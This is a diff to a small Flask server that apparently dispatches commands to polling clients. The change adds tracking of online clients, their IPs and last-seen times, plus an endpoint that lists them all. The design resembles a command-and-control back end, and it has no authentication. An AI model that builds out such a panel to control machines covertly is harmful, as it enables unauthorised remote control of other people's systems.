@@ -1,15 +1,19 @@
 from flask import Flask, request, jsonify
+import time # Import time for last_seen timestamp
 
 app = Flask(__name__)
 client_commands = {}
+connected_clients = {} # New dictionary to store connected clients
 
 @app.route('/heartbeat', methods=['POST'])
 def heartbeat():
     data = request.form # Heartbeat sends form data
     client_id = data.get('client_id')
     ip = data.get('ip')
-    # In a real app, you'd store client's last seen time, IP, etc.
-    print(f"Heartbeat from {client_id} (IP: {ip})")
+    
+    if client_id:
+        connected_clients[client_id] = {"ip": ip, "status": "online", "last_seen": time.time()}
+        print(f"Heartbeat from {client_id} (IP: {ip}). Clients online: {len(connected_clients)}")
     return jsonify({"status": "ok"})
 
 @app.route('/send-command', methods=['POST'])
@@ -37,6 +41,13 @@ def get_command():
     
     print(f"No command for client {client_id}")
     return jsonify({"cmd": "", "title": "", "message": ""}) # Return empty JSON if no command
+
+@app.route('/get-clients')
+def get_clients():
+    # In a real app, you might want to filter out old/disconnected clients here
+    # For now, return all clients that have sent a heartbeat recently
+    print(f"Returning {len(connected_clients)} connected clients.")
+    return jsonify(connected_clients)
 
 if __name__ == '__main__':
     app.run(host="0.0.0.0", port=5000)
